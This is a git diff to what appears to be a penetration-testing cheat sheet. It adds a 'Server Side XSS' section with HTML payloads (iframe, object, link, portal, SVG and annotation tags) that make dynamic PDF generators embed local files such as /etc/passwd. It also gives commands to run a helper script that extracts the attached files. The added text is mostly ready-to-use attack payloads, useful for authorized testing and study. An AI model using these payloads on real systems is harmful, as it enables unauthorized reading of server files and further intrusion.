@@ -19,6 +19,7 @@
 - [SQL Injection](#sql-injection)
 - [SSTI](#ssti)
 - [XML external entity (XXE)](#xml-external-entity-xxe)
+- [Server Side XSS](#server-side-xss)
 
 # BruteForce
 ### Wordlist
@@ -326,4 +327,31 @@ wpscan --force update -e --url IP --disable-tls-checks
 # Certificate
 ```
 curl <url> --key KEY.key --cert CERT.cert
+```
+
+# Server Side XSS
+
+### Read local file (Dynamic PDF)
+
+#### (Basic)
+
+```
+<iframe src=file:///etc/passwd></iframe>
+<img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+<link rel=attachment href="file:///etc/passwd">
+<object data="file:///etc/passwd">
+<portal src="file:///etc/passwd" id="portal">
+<svg-dummy></svg-dummy><iframe src='file:///etc/passwd' width='100%' height='1000px'></iframe><svg viewBox='0 0 240 80' height='1000' width='1000' xmlns='http://www.w3.org/2000/svg'><text x='0' y='0' class='Rrrrr' id='demo'>data</text></svg>
+```
+
+#### (Advanced)
+
+```
+<annotation file="/etc/passwd" content="/etc/passwd" icon="graph" title="Attached File: /etc/passwd" pos-x="195" />
+```
+
+You can extract annotation files with this [script](https://github.com/sawyerf/HackSheet/scripts/get-pdf-annot.py):
+```
+pip install pymupdf
+python script/get-pdf-annot.py -f "<HTTP(S)_URL> OR <PDF_PATH>"
 ```
